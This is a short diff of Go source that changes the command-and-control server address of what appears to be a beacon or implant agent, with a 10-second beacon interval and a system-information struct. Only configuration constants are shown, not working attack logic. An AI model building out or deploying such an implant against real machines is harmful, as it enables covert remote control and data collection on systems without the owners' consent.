@@ -11,7 +11,7 @@ import (
 	"time"
 )
 const (
-    C2Server       = "http://10.54.50.172:5000" // change ip
+    C2Server       = "http://10.10.10.10:5000" // change ip
     BeaconInterval = 10 * time.Second
 )
 type SystemInfo struct {
